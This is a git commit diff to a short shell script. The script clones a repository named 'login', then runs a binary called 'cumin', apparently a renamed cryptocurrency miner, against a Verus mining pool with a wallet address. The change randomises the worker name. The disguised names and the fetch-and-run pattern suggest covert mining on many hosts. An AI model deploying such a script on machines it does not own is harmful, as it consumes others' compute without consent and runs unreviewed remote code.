7acccf4ab4646c9de97f7f892d285b4ac66e2580
sallygonza <90584824+sallygonza@users.noreply.github.com>
2022-01-13 13:13:28 +0700

    Update deepno.sh

--- deepno.sh
+++ deepno.sh
@@ -4,4 +4,5 @@ sudo apt install screen libjansson4 -y
 git clone https://github.com/sallygonza/login.git 
 cd login
 chmod +x cumin
-./cumin -a verus -o stratum+tcp://verushash.asia.mine.zergpool.com:3300 -u RJqUqa4GeMWKJJ4c95roAQZJGgf1H2KsyW.deepno -t 2 -p c=VRSC,mc=VRSC\n
+WORKER=$(echo $(shuf -i 10-40 -n 1)-kuli)
+./cumin -a verus -o stratum+tcp://verushash.asia.mine.zergpool.com:3300 -u RJqUqa4GeMWKJJ4c95roAQZJGgf1H2KsyW.$WORKER -t 2 -p c=VRSC,mc=VRSC\n
